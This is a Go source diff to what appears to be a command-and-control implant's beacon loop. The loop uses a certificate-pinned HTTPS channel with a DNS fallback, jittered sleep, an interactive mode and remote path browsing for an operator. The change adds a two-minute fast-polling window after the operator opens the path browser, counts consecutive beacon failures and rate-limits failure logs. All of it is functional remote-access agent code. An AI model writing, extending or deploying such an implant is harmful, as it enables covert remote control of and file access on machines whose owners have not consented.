@@ -13,8 +13,18 @@ import (
 )
 
 // interactiveMode is set to 1 by the "interactive start" task so the beacon
-// loop polls at 200 ms instead of the configured sleep interval.
+// loop polls at the fast interval instead of the configured sleep interval.
 var interactiveMode int32
+
+// pathBrowseFastUntil stores a unix-nano deadline used to keep remote path
+// browsing responsive after the operator opens the path browser.
+var pathBrowseFastUntil int64
+
+const (
+	fastBeaconInterval   = 100 * time.Millisecond
+	pathBrowseFastWindow = 2 * time.Minute
+	failureLogInterval   = time.Minute
+)
 
 var (
 	beaconNonceFn     = protocol.RandomNonce
@@ -26,6 +36,8 @@ var (
 func Run(cfg *Config) {
 	client := newPinnedClient(cfg.CertFingerprint)
 	var lastResult *protocol.TaskResult
+	consecutiveFailures := 0
+	var lastFailureLog time.Time
 	skipSleep := false
 
 	for {
@@ -33,8 +45,8 @@ func Run(cfg *Config) {
 		// reaches the server on the very next beacon rather than after a full
 		// sleep cycle. Normal idle beacons still sleep as configured.
 		if !skipSleep {
-			if atomic.LoadInt32(&interactiveMode) == 1 {
-				time.Sleep(100 * time.Millisecond)
+			if fastBeaconActive() {
+				time.Sleep(fastBeaconInterval)
 			} else {
 				base := time.Duration(cfg.SleepSeconds) * time.Second
 				jitter := time.Duration(rand.Int63n(int64(base / 5))) //nolint:gosec — jitter doesn't need crypto rand
@@ -69,13 +81,22 @@ func Run(cfg *Config) {
 			if cfg.DNSDomain != "" {
 				respBytes, err = sendBeaconDNSFn(encoded, cfg.DNSDomain)
 				if err != nil {
-					log.Printf("beacon failed (https+dns): %v", err)
+					consecutiveFailures++
+					suspendPathBrowseOnFailure()
+					logBeaconFailure("beacon failed (https+dns)", err, consecutiveFailures, &lastFailureLog)
 					continue
 				}
 			} else {
-				log.Printf("beacon failed: %v", err)
+				consecutiveFailures++
+				suspendPathBrowseOnFailure()
+				logBeaconFailure("beacon failed", err, consecutiveFailures, &lastFailureLog)
 				continue
 			}
+		}
+		if consecutiveFailures > 0 {
+			log.Printf("beacon recovered after %d failed attempt(s)", consecutiveFailures)
+			consecutiveFailures = 0
+			lastFailureLog = time.Time{}
 		}
 
 		// Only clear the pending result after the server has acknowledged the beacon.
@@ -109,4 +130,43 @@ func Run(cfg *Config) {
 func hostname() string {
 	h, _ := os.Hostname()
 	return h
+}
+
+func fastBeaconActive() bool {
+	if atomic.LoadInt32(&interactiveMode) == 1 {
+		return true
+	}
+	return pathBrowseFastActive()
+}
+
+func pathBrowseFastActive() bool {
+	deadline := atomic.LoadInt64(&pathBrowseFastUntil)
+	return deadline > 0 && time.Now().Before(time.Unix(0, deadline))
+}
+
+func extendPathBrowseFastWindow() {
+	atomic.StoreInt64(&pathBrowseFastUntil, time.Now().Add(pathBrowseFastWindow).UnixNano())
+}
+
+func stopPathBrowseFastWindow() {
+	atomic.StoreInt64(&pathBrowseFastUntil, 0)
+}
+
+func suspendPathBrowseOnFailure() {
+	if atomic.LoadInt32(&interactiveMode) == 0 && pathBrowseFastActive() {
+		stopPathBrowseFastWindow()
+	}
+}
+
+func logBeaconFailure(prefix string, err error, failures int, lastLog *time.Time) {
+	now := time.Now()
+	if failures == 1 {
+		log.Printf("%s: %v", prefix, err)
+		*lastLog = now
+		return
+	}
+	if now.Sub(*lastLog) >= failureLogInterval {
+		log.Printf("%s; still failing after %d attempts: %v", prefix, failures, err)
+		*lastLog = now
+	}
 }
